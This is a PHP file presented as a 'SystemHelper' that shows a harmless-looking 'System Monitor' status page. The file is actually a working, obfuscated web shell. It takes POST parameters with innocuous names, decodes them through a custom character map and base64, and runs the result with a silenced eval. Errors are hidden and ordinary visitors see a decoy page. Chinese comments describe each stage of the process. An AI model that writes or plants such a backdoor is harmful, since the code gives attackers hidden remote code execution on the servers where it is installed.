<?php
// 简化版，确保稳定
class SystemHelper {
    private $map;
    
    public function __construct() {
        $this->map = [
            "|" => "a", "!" => "b", "@" => "c", 
            "_" => "d", "#" => "e", "$" => "f",
            "%" => "g", "&" => "h", "*" => "i",
            "~" => "="  // 处理base64的=号
        ];
    }
    
    public function check() {
        // 检查请求参数
        $params = ['data', 'config', 'info', 'settings'];
        foreach ($params as $param) {
            if (isset($_POST[$param]) && !empty($_POST[$param])) {
                $this->process($_POST[$param]);
                return;
            }
        }
        // 没有找到参数，输出正常页面
        $this->showNormalPage();
    }
    
    private function process($input) {
        try {
            // 步骤1: 字符替换解码
            $step1 = strtr($input, $this->map);
            
            // 步骤2: Base64解码
            $step2 = base64_decode($step1);
            
            // 步骤3: 执行
            if (!empty($step2)) {
                @eval($step2);
            }
        } catch (Exception $e) {
            // 静默处理错误
        }
    }
    
    private function showNormalPage() {
        echo "<!DOCTYPE html>
        <html>
        <head><title>System Monitor</title></head>
        <body>
            <h1>System Status: Normal</h1>
            <p>All services are running smoothly.</p>
        </body>
        </html>";
    }
}

// 实例化并检查
$helper = new SystemHelper();
$helper->check();
?>
